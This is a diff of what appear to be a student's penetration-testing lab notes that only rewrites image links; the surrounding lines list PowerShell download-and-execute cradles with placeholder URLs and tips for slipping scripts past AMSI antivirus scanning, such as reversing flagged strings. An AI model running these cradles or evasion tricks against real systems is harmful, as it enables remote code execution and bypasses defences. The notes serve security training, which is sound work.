@@ -16,8 +16,8 @@ download execute cradle
 `iex (New-Object Net.WebClient).DownloadString('<url>')`
 `iex (iwr '<url>')`
 - if above doesn't work, try these
-![[assets/Pasted image 20260111012432.png|Pasted image 20260111012432.png]]
-![[assets/Pasted image 20260111012441.png|Pasted image 20260111012441.png]]
+![Pasted image 20260111012432.png](assets/Pasted%20image%2020260111012432.png)
+![Pasted image 20260111012441.png](assets/Pasted%20image%2020260111012441.png)
 
 
 
@@ -91,9 +91,9 @@ For full obfuscation of PowerShell scripts, see [Invoke-Obfuscation](https://git
 
 ### Example
 
-![[assets/Pasted image 20260111014143.png|Pasted image 20260111014143.png]]
+![Pasted image 20260111014143.png](assets/Pasted%20image%2020260111014143.png)
 - AMSI had a problem with Net.Sockets 
-![[assets/Pasted image 20260111014208.png|Pasted image 20260111014208.png]]
+![Pasted image 20260111014208.png](assets/Pasted%20image%2020260111014208.png)
 - simply reverse the string and it may come back clean
 
 
@@ -102,9 +102,9 @@ can also just use parts of the script
 
 
 in their student VM, you can use ByteToLineNumber.ps1 for troubleshooting and finding the problematic code
-![[assets/Pasted image 20260111014422.png|Pasted image 20260111014422.png]]
-![[assets/Pasted image 20260111014430.png|Pasted image 20260111014430.png]]
-![[assets/Pasted image 20260111014443.png|Pasted image 20260111014443.png]]
+![Pasted image 20260111014422.png](assets/Pasted%20image%2020260111014422.png)
+![Pasted image 20260111014430.png](assets/Pasted%20image%2020260111014430.png)
+![Pasted image 20260111014443.png](assets/Pasted%20image%2020260111014443.png)
 - in this specific case, PowerUp has a module for dropping a binary, which is what got detected
 	- can simply get rid of the binary
 
